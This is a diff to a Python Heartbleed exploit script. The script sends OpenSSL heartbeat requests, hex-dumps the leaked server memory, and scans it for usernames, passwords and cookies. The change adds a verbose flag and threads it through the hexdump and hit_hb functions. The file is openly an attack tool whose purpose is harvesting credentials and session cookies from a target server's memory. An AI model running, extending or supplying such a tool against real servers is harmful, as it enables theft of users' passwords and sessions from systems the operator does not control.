@@ -29,6 +29,7 @@ options = OptionParser(usage='%prog server [options]', description='Test for SSL
 options.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')
 options.add_option('-n', '--num', type='int', default=1, help='Number of times to connect/loop (default: 1)')
 options.add_option('-f', '--file', type='str', default='', help='Name of the file in which to dump the output (default: output.txt)')
+options.add_option('-v', '--verbose', default=False, help='Run exploit script and dump all output to console; does not skip empty lines (default: false)', action='store_true')
 options.add_option('-q', '--quiet', default=False, help='Run exploit script without dumping output to the console (default: false)', action='store_true')
 options.add_option('-c', '--cookie', default=False, help='Detect whether exploit returned any cookies (default: false)', action='store_true')
 options.add_option('-w', '--pwd', default=False, help='Detect whether exploit returned any passwords (default: false)', action='store_true')
@@ -118,11 +119,11 @@ def getCredentials(info, key):
             i = info.index(key)
     return items
 
-def hexdump(s, file, quiet):
+def hexdump(s, file, quiet, verbose):
 
     # Open output file (if specified by user)
     if len(file) > 0:
-        consoleLog(colors.OKGREEN + 'DONE: ' + colors.END + 'memory dump was saved in output file.', quiet)
+        consoleLog(colors.OKGREEN + 'DONE: ' + colors.END + 'memory dump was saved in output file.\n', quiet)
         output = open(file, 'a')
 
     # Variables for detecting passwords and cookies in memory dump
@@ -138,8 +139,9 @@ def hexdump(s, file, quiet):
         info += pdat
 
         # Skip printing empty lines (lines that do not decode to useful information
+        # If verbose option specified by user empty lines are printed
         _temp = pdat.replace('.','')
-        if len(_temp) > 0:
+        if len(_temp) > 0 or verbose:
             if len(file) > 0:
                 output.write('  %04x: %-48s %s\n' % (b, hxdat, pdat))
             else:
@@ -195,7 +197,7 @@ def recvmsg(s, quiet):
     consoleLog(_tmp, quiet)
     return typ, ver, pay
 
-def hit_hb(s, file, quiet, pwd, cookie):
+def hit_hb(s, file, pwd, cookie, quiet, verbose):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s, quiet)
@@ -206,7 +208,7 @@ def hit_hb(s, file, quiet, pwd, cookie):
         if typ == 24:
             consoleLog('Received heartbeat response:', quiet)
             # Parse information from heartbeat response
-            users, passwords, cookies, hasPwd, hasCookie = hexdump(pay, file, quiet)
+            users, passwords, cookies, hasPwd, hasCookie = hexdump(pay, file, quiet, verbose)
 
             # Log to console the list of users
             logList(users[1:], 'USERS', colors.OKBLUE, quiet)
@@ -229,7 +231,7 @@ def hit_hb(s, file, quiet, pwd, cookie):
 
         if typ == 21:
             consoleLog('Received alert:', quiet)
-            hexdump(pay, file, quiet)
+            hexdump(pay, file, quiet, verbose)
             consoleLog(colors.FAIL + 'ERROR: ' + colors.END + 'server returned error, likely not vulnerable', quiet)
             return False
 
@@ -266,7 +268,7 @@ def main():
       consoleLog(_tmp, opts.quiet)
       sys.stdout.flush()
       s.send(hb)
-      hit_hb(s, opts.file, opts.quiet, opts.pwd, opts.cookie)
+      hit_hb(s, opts.file, opts.pwd, opts.cookie, opts.quiet, opts.verbose)
 
 if __name__ == '__main__':
     main()
